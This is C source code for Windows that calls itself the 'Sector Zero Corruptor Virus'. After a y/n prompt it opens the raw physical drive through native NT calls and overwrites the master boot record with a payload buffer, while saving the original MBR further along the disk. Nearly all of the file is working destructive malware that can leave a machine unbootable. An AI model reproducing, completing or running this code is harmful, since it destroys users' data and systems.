#include "Defs.h"

int wmain()
{
    wprintf(L"\n\t---=== Sector Zero Corruptor Virus ===---\t\n");
    wprintf(L"This program will destroy (master boot record) of \\\\.\\PhysicalDrive0..\n");
    wprintf(L"\t\t Are you sure that you want to destry MBR? (y/n)\n");
    wchar_t answer = getwchar();

    if (answer == L'y' || answer == L'Y')
    {
        UNICODE_STRING fileName;
        RtlInitUnicodeString(&fileName, L"\\GLOBAL??\\PhysicalDrive0");

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hDevice;
        IO_STATUS_BLOCK ioStatusBlock;

        NTSTATUS status = NtCreateFile(
            &hDevice,
            GENERIC_READ | GENERIC_WRITE,
            &objAttr,
            &ioStatusBlock,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN,
            0,
            NULL,
            0);

        if (!NT_SUCCESS(status))
        {
            wprintf(L"Error (NtCreateFile): %x\n", status);
            return 1;
        }

        LARGE_INTEGER ByteOffset; // This is needed for NtWriteFile otherwise it will fail with STATUS_INVALID_PARAMETER

        ByteOffset.QuadPart = 0;

        BYTE MBRorginal[512] = { 0x41 };

        status = NtReadFile(hDevice, NULL, NULL, NULL, &ioStatusBlock, MBRorginal, sizeof(MBRorginal), &ByteOffset, NULL);

        if (!NT_SUCCESS(status))
        {
            wprintf(L"Error (NtReadFile): %x\n", status);
            NtClose(hDevice);
            return 1;
        }

        Sleep(2000);

        LPVOID buffer2 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (1024 + 1536) * sizeof(BYTE));

        if (buffer2 == NULL)
        {
            wprintf(L"Error (HeapAlloc): %x\n", GetLastError());
            NtClose(hDevice);
            return 1;
        }

        ByteOffset.QuadPart = 0;

        memcpy(buffer2, buffer, sizeof(buffer));
        memset((BYTE*)buffer2 + 1536, 0, 512);
        memcpy((BYTE*)buffer2 + 1536 + 512, MBRorginal, sizeof(MBRorginal));

        status = NtWriteFile(hDevice, NULL, NULL, NULL, &ioStatusBlock, buffer2, (1024 + 1536) * sizeof(BYTE), &ByteOffset, NULL);

        if (!NT_SUCCESS(status))
        {
            wprintf(L"Error (NtWriteFile): %x\n", status);
            NtClose(hDevice);
            return 1;
        }

        wprintf(L"MBR was destroyed successfully!\n");
        NtClose(hDevice);
    }
    else
    {
        wprintf(L"MBR was not destroyed!\n");
    }

    return 0;
}